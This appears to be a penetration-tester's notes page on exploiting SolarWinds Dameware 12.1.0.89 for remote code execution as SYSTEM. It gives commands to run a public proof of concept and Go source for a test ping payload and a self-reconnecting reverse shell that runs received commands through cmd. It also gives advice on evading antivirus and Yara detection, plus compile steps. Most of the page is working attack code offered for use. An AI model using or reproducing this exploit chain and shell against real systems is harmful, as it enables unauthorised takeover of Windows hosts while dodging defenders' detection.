# Dameware v 12.1.0.89

If port 6129 dameware is open, check the version number. If it is version 12.1.0.89 and below, the box may be vulnerable to Remote Code Execution.
```
git clone https://github.com/tenable/poc
cd poc/Solarwinds/Dameware
python dwrcs_dwDrvInst_rce.py -t <ip-address> -e <payload>
```
Refer to python 2 installation and setup instructions as the POC will not execute with 3. **Need to update this**

The POC will accept any windows PE, transfer it to a remote host, and run it from C:\Windows\TEMP as SYSTEM. Most msfvenom-generated payloads will likely be prevented from running by an AV; however, Go-compiled executables seem to run undetected (at least initially).

### Go Environment Set-up
`sudo apt install golang`\
Put the two files below in a directory of your choice and then:
```
go mod init dcod/payloads
go mod tidy
```

### Exploit
Edit each file with a desired destination before compilation.\ 
`ping.go` will issue three ICMP echo requests from the remote host, verifying that the Dameware process is vulnerable. 
```golang
package main

import "fmt"
import "github.com/go-ping/ping"

func main() {

    // replace with the IP of your host
    pinger, err := ping.NewPinger("127.0.0.1")
    pinger.SetPrivileged(true)
    if err != nil {
        panic(err)
    }
    pinger.Count = 3
    pinger.Run()
    stats := pinger.Statistics()
    fmt.Println(stats)
}
```
Calling exec.Command generates certain artifacts in the binary file which are easily matched by various Yara rules; therefore, it's preferable to attempt a ping first.\
Use the following to listen for incoming ICMP echo requests\
`tcpdump -i eth0 -nn "icmp[icmptype] == icmp-echo and src host <dameware-host>"`

`shell.go` may be used to open a reverse a shell for further exploitation. 
```golang
package main

import (
    "bufio"
    "net"
    "os/exec"
    "syscall"
    "time"
)

func main() {
    // replace with the IP:port of your listener
    reverse("127.0.0.1:1337")
}

func reverse(host string) {
    c, err := net.Dial("tcp", host)
    if nil != err {
        if nil != c {
            c.Close()
        }
        time.Sleep(time.Minute)
        reverse(host)
    }

    r := bufio.NewReader(c)
    for {
        order, err := r.ReadString('\n')
        if nil != err {
            c.Close()
            reverse(host)
            return
        }

        cmd := exec.Command("cmd", "/C", order)
        cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
        out, _ := cmd.CombinedOutput()

        c.Write(out)
    }
}
```
Compile shell.go:
`GOOS=windows GOARCH=amd64 go build -o <filename>.exe <filename>.go`
